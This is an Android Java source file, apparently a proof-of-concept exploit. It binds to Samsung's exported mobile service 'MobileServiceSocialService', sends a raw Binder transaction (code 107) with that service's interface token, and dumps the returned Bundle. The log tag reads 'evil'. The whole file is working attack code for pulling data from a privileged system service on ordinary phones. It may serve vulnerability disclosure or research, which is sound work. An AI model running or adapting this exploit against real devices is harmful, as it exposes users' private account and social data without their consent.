package poc.app;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.util.Log;

public class MainActivity extends Activity {
    private ServiceConnection mServiceConnection = new ServiceConnection() {
        public void onServiceConnected(ComponentName cName, IBinder service) {
            processBinder(service);
        }

        public void onServiceDisconnected(ComponentName cName) {
        }
    };

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent i = new Intent();
        i.setClassName("com.samsung.android.mobileservice", "com.samsung.android.mobileservice.social.MobileServiceSocialService");
        bindService(i, mServiceConnection, BIND_AUTO_CREATE);
    }

    private void processBinder(IBinder binder) {
        try {
            Parcel parcel = Parcel.obtain();
            parcel.writeInterfaceToken("com.samsung.android.sdk.mobileservice.social.IMobileServiceSocial");

            Parcel reply = Parcel.obtain();

            binder.transact(107, parcel, reply, 0);
            reply.readException();

            if (reply.readBoolean()) {
                Bundle replyBundle = new Bundle();
                replyBundle.readFromParcel(reply);
                DumpUtils.dump(replyBundle, getClassLoader());
            } else {
                Log.d("evil", "null");
            }
        } catch (Throwable th) {
            throw new RuntimeException(th);
        }
    }
}